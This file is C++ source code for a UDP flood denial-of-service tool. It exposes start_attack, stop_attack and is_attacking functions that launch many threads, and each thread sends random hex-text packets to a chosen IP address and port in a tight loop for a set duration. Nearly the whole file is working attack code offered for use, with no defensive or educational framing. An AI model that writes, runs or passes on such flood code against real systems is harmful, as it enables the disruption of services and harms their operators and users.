#include <iostream>
#include <cstdlib>
#include <cstring>
#include <arpa/inet.h>
#include <pthread.h>
#include <ctime>
#include <csignal>
#include <vector>
#include <memory>
#include <atomic>
#include <unistd.h>

#define PAYLOAD_SIZE 20

static std::atomic<bool> attack_running{false};
static std::vector<pthread_t> thread_ids;
static std::vector<std::unique_ptr<class Attack>> attacks;

class Attack {
public:
    Attack(const std::string& ip, int port, int duration)
        : ip(ip), port(port), duration(duration) {}

    void generate_payload(char *buffer, size_t size) {
        for (size_t i = 0; i < size; i++) {
            buffer[i * 4] = '\\';
            buffer[i * 4 + 1] = 'x';
            buffer[i * 4 + 2] = "0123456789abcdef"[rand() % 16];
            buffer[i * 4 + 3] = "0123456789abcdef"[rand() % 16];
        }
        buffer[size * 4] = '\0';
    }

    void attack_thread() {
        int sock;
        struct sockaddr_in server_addr;
        time_t endtime;
        
        char payload[PAYLOAD_SIZE * 4 + 1];
        generate_payload(payload, PAYLOAD_SIZE);

        if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
            perror("Socket creation failed");
            return;
        }

        memset(&server_addr, 0, sizeof(server_addr));
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(port);
        server_addr.sin_addr.s_addr = inet_addr(ip.c_str());

        endtime = time(NULL) + duration;
        while (attack_running && time(NULL) <= endtime) {
            ssize_t payload_size = strlen(payload);
            sendto(sock, payload, payload_size, 0, (const struct sockaddr *)&server_addr, sizeof(server_addr));
        }

        close(sock);
    }

private:
    std::string ip;
    int port;
    int duration;
};

extern "C" {
    int start_attack(const char* ip, int port, int duration_sec, int thread_count) {
        if (attack_running) return -1;
        attack_running = true;
        thread_ids.clear();
        attacks.clear();
        attacks.reserve(thread_count);

        for (int i = 0; i < thread_count; i++) {
            attacks.push_back(std::make_unique<Attack>(ip, port, duration_sec));
            pthread_t tid;
            if (pthread_create(&tid, NULL, [](void* arg) -> void* {
                Attack* attack = static_cast<Attack*>(arg);
                attack->attack_thread();
                return nullptr;
            }, attacks[i].get()) != 0) {
                attack_running = false;
                return -2;
            }
            thread_ids.push_back(tid);
        }
        return 0;
    }

    void stop_attack() {
        attack_running = false;
        for (auto& tid : thread_ids) pthread_join(tid, NULL);
        thread_ids.clear();
        attacks.clear();
    }

    int is_attacking() {
        return attack_running ? 1 : 0;
    }
}
